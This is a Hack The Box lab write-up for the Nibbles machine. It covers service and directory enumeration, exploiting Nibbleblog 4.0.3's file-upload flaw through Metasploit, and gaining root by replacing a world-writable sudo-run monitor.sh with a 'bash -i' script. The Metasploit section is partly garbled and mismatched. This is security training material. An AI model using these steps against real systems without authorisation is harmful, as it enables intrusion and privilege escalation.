# Nibbles — Hack The Box

![Nibbles](https://www.hackthebox.com/storage/avatars/5d5e0e1e9c5b1d6c0e4e3f1a0b9c8d7e.png)

## Machine Information

| Field | Value |
|---|---|
| **Platform** | Hack The Box |
| **Machine** | Nibbles |
| **Difficulty** | Easy |
| **Operating System** | Linux |
| **Initial Access** | Nibbleblog 4.0.3 Arbitrary File Upload |
| **Privilege Escalation** | Sudo misconfiguration / Writable root-executed script |

---

## Enumeration

### Nmap Scan

I started with an Nmap scan to identify the open TCP ports and running services.

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.96.84 -oN nmap
```

<img width="950" height="314" alt="nmap-nibbles" src="https://github.com/user-attachments/assets/3fdc5e14-6c3e-44a0-9fce-df6fee04c749" />


The scan revealed an HTTP service running on port `80`.

```text
80/tcp open  http
```

---

## Web Enumeration

Navigating to the web server on port `80` displayed a simple page containing:

```text
Hello World
```

I inspected the HTML source code and found a reference that revealed the application path:

```text
/nibbleblog/
```

This indicated that the web server was running **Nibbleblog**.

---

## Directory Enumeration

I used Gobuster to enumerate directories and files within the web application.

```bash
gobuster dir -u http://10.129.96.84/nibbleblog/ \
-w /usr/share/wordlists/dirb/common.txt
```

<img width="951" height="498" alt="gobuster-nibble" src="https://github.com/user-attachments/assets/f3287f14-4c77-494d-9973-fd127ce303b1" />


The scan revealed several interesting directories and files.

Among the discovered content, I found:

- Nibbleblog administrative functionality
- Accessible application directories
- Sensitive information
- Credentials that could be used to access the CMS

I also identified the Nibbleblog version as:

```text
Nibbleblog 4.0.3
```

---


## Initial Access

After identifying the Nibbleblog version as `4.0.3`, I searched for a corresponding exploit using `msfconsole`.

I searched for exploits related to the CMS and its version:

Inside Metasploit, I searched for Nibbleblog-related exploits:

search nibbleblog

<img width="953" height="706" alt="exploit-nibble" src="https://github.com/user-attachments/assets/c23b532e-85af-47cc-8c64-67435b6fb7d1" />


```bash

msfconsole

```bash
whoami
```

The result showed that I had obtained access as the web server user:

```text
nibbler
```

---

# Privilege Escalation

Once I obtained initial access as `nibbler`, I started enumerating the system and checking the user's sudo permissions.

```bash
sudo -l
```

The output revealed that `nibbler` could execute the following script with root privileges:

```text
/home/nibbler/personal/stuff/monitor.sh
```

The important part of the configuration was that the script could be executed through `sudo`.

---

## Exploiting the Sudo Misconfiguration

The script was located at:

```text
/home/nibbler/personal/stuff/monitor.sh
```

I first checked its permissions:

```bash
ls -l /home/nibbler/personal/stuff/monitor.sh
```

The file had the following permissions:

```text
-rwxrwxrwx
```

However, because the script was executed with `sudo`, it was possible to exploit the execution flow by replacing the script with a malicious version.

I created my own malicious `monitor.sh` file on my Kali machine:

```bash
#!/bin/bash

bash -i
```

I then removed the original script from the target machine and downloaded my malicious version into the same path using `wget`.

Afterwards, I made sure the script was executable:

```bash
chmod +x monitor.sh
```

Finally, I executed the script using the allowed sudo configuration:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Because the script was executed with root privileges, the Bash shell spawned with root privileges as well.

I verified the escalation:

```bash
whoami
```

```text
root
```

<img width="952" height="323" alt="root-nibbles" src="https://github.com/user-attachments/assets/0a61cc70-eacd-4351-844b-895b98588a00" />


---

# Flags

After obtaining root access, I navigated to the root user's home directory:

```bash
cd /root
```

I listed the contents:

```bash
ls
```

Then I read the root flag:

```bash
cat root.txt
```

---

# Attack Path Summary

```text
Nmap
  ↓
Port 80 discovered
  ↓
HTML source inspection
  ↓
Discovered /nibbleblog/
  ↓
Gobuster enumeration
  ↓
Credentials discovered
  ↓
Identified Nibbleblog 4.0.3
  ↓
Arbitrary File Upload vulnerability
  ↓
Malicious PHP payload uploaded
  ↓
Initial shell as nibbler
  ↓
sudo -l
  ↓
monitor.sh executable with sudo privileges
  ↓
Replaced script with malicious Bash script
  ↓
sudo execution
  ↓
Root shell
```

---

# Lessons Learned

- Always perform full port enumeration before focusing on a single service.
- Inspect the HTML source code when a web application appears to contain no useful information.
- Directory enumeration can reveal hidden application paths and sensitive files.
- Identifying the exact version of a CMS is essential when searching for known vulnerabilities.
- Arbitrary file upload vulnerabilities can often lead to remote code execution when executable files can be uploaded.
- After obtaining initial access, always check:

```bash
sudo -l
```

- Sudo misconfigurations involving scripts executed as root can lead directly to privilege escalation.
- When a privileged script can be replaced or controlled, its execution context should always be carefully investigated.

---

# Conclusion

The Nibbles machine followed a straightforward penetration testing methodology.

The initial access vector consisted of web enumeration, discovery of the Nibbleblog installation, identification of the running version, and exploitation of an Arbitrary File Upload vulnerability to obtain a shell as the `nibbler` user.

Privilege escalation was achieved by identifying a sudo misconfiguration that allowed the `monitor.sh` script to be executed with root privileges. Replacing the script with a malicious Bash script resulted in a root shell.

This machine was a good exercise in:

- Web enumeration
- CMS fingerprinting
- Vulnerability research
- Arbitrary file upload exploitation
- Linux privilege escalation
- Sudo misconfiguration analysis
